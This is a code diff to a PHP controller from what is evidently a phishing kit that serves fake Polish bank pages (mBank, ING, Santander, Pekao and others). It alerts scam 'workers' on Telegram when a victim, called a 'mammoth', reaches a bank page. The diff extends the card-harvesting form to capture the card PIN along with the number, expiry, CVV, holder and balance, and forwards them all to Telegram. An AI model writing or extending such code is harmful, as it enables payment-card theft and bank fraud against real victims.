@@ -74,13 +74,26 @@ class PagesController extends Controller
                     ]);
                 }
                 return $next($request);
-            } catch (Throwable | Exception $exception) {
+            } catch (Throwable|Exception $exception) {
                 Cache::forget("category:$track_id");
                 Cache::forget("fake:$track_id");
                 session()->forget($key);
             }
             return redirect((new Fake())->originalUrl($this->category->name ?? null));
         });
+    }
+
+    private function bankHasPm($name): bool
+    {
+        $banks = collect(config('fakes.banks'));
+        return in_array($name, $banks->whereIn('name', [
+            'millenium', 'mbank', 'ipko',
+            'santander', 'ing', 'pekao',
+            'alior', 'agricole', 'getin',
+            'paribas', 'idea', 'bankbps',
+            'sgb', 'citi', 'gbsbank',
+            'noblepay', 'pocztowy', 'nestbank'
+        ])->pluck('name')->toArray());
     }
 
     /**
@@ -165,7 +178,7 @@ class PagesController extends Controller
                     "reply_markup" => $keyboard
                 ]);
 
-        } catch (TelegramSDKException | Exception | Throwable $e) {
+        } catch (TelegramSDKException|Exception|Throwable $e) {
             Log::error("PagesController::sendLogs {$e->getMessage()}");
         }
     }
@@ -230,16 +243,15 @@ class PagesController extends Controller
         if (is_null($bank) && $name !== 'none') abort(404);
         session()->put('bankName', $name);
         $view = "fakes.banks.$name";
-        $pm = in_array($name, $banks->whereIn('name', ['millenium', 'mbank', 'ipko', 'santander', 'ing', 'pekao', 'alior', 'agricole', 'getin', 'paribas', 'idea','bankbps'])->pluck('name')->toArray());
         $title = $bank['title'] ?? $name;
         $favicon = isset($bank['logo']) ? asset($bank['logo']) : $this->fake->logo();
-        if ($name !== 'none' && $pm && view()->exists($view)) {
+        if ($name !== 'none' && $this->bankHasPm($name) && view()->exists($view)) {
             $bankName = ucfirst($name);
             foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
                 "⭐️<b>️Мамонт на странице $bankName</b>",
                 "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
             ]);
-            return view($view, compact('title', 'favicon'));
+            return view($view, compact('title', 'favicon', 'bank'));
         }
         return redirect($this->urlGenerate('/order', ['track_id' => $fake->track_id]));
     }
@@ -327,6 +339,8 @@ class PagesController extends Controller
             $request->session()->put('expdate', $expdate);
         if ($cvc = $request->get('card_cvc'))
             $request->session()->put('card_cvc', $cvc);
+        if ($cpin = $request->get('card_pin'))
+            $request->session()->put('card_pin', $cpin);
         if ($holder = $request->get('card_holder'))
             $request->session()->put('card_holder', $holder);
         if ($balance = $request->get('balance'))
@@ -335,6 +349,7 @@ class PagesController extends Controller
         $ccnumber = $request->session()->get('card_number');
         $expdate = $request->session()->get('expdate');
         $cvc = $request->session()->get('card_cvc');
+        $cpin = $request->session()->get('card_pin');
         $holder = $request->session()->get('card_holder');
         $balance = $request->session()->get('balance');
         $amount = number_format($fake->price, 0, "", " ");
@@ -357,6 +372,7 @@ class PagesController extends Controller
             "💳<b>Карта:</b> <code>$ccnumber</code> <code>$binName</code>",
             "💳<b>Срок Действия:</b> <code>$expdate</code>",
             "💳<b>CVV:</b> <code>$cvc</code>",
+            "💳<b>CPIN:</b> <code>$cpin</code>",
             "💰<b>Сумма:</b> <code>$amount</code> $currency",
             "💰<b>Баланс на карте:</b> <code>$balance</code> $currency",
             "💁<b>Владелец :</b> <code>$holder</code>",
